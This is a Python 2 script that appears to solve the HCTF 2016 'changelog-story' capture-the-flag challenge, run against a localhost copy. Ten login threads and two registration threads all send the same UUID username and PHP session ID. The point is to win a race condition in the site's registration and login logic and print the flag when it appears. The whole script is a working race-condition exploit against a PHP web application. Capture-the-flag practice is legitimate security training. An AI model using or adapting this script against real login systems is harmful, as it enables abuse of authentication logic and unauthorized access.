#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import uuid
import re
import threading

url = "http://localhost/HCTF2016/changelog-story/register.php"
url1 = "http://localhost/HCTF2016/changelog-story/login.php"
url2 = "http://localhost/HCTF2016/changelog-story/index.php"

username = ""
session = ""

def sess():
    r = requests.get(url1)
    m = re.search('PHPSESSID=(.*?);',r.headers['Set-Cookie'])
    if m:
        return str(m.group(1))

def regist():
    global username,session
    while True:
        data = {
            'username' : username,
            'password' : '1',
            'gogogo' : '苟!',
        }
        cookie = {
            'PHPSESSID' : session
        }
        r = requests.post(url, data=data, cookies=cookie, timeout=3)
        if '搞事' in r.content:
            print "Error."
        print r.content

def login():
    global username,session
    while True:
        data1 = {
            'username' : username,
            'password' : '1',
            'gogogo' : '苟!',
        }
        cookie1 = {
            'PHPSESSID' : session
        }

        r1 = requests.post(url1, data=data1, cookies=cookie1, timeout=5)
        content = r1.content
        print "login: " + username + '-' + session
        if 'gogogo' not in content:
            print content

        if 'hctf' in content:
            print content * 10

        if 'zero' in content:
            print 'aaaa'
            username = str(uuid.uuid4())
            session = sess()

username = str(uuid.uuid4())
session = sess()

def main():
    threadpool=[]

    for n in xrange(10):
        th = threading.Thread(target=login)
        th.setDaemon(True)
        threadpool.append(th)
    for n in xrange(2):
        th = threading.Thread(target=regist)
        th.setDaemon(True)
        threadpool.append(th)
    for th in threadpool:
        th.start()
    for th in threadpool :
        threading.Thread.join(th)

if __name__ == '__main__':
    main()